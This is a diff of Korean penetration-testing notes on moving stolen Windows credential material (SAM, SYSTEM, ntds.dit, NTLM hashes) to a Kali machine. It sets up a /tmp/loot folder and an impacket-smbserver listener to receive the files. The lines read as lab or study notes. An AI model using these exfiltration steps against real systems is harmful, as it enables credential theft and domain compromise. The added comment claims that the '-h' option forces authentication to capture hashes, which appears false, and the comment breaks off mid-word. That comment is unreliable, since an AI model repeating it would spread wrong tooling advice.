@@ -2,7 +2,7 @@
 
 # 파일전송 — Windows → Linux (수집)
 
-SAM, SYSTEM, ntds.dit, 크리덴셜 파일 등을 칼리로 가져오는 방법.
+SAM, SYSTEM, ntds.dit, NTLM 해시, 크리덴셜 파일 등을 칼리로 가져오는 방법.
 
 ---
 
@@ -17,7 +17,7 @@ ip a show tun0
 ```bash
 # 칼리에서 리스너 서버 실행
 mkdir /tmp/loot
-impacket-smbserver share /tmp/loot -smb2support
+impacket-smbserver share /tmp/loot -smb2support # NTLM 해시를 받을 경우 -h 옵션을 붙여 인증을 강제할 수 있
 ```
 
 ```bash
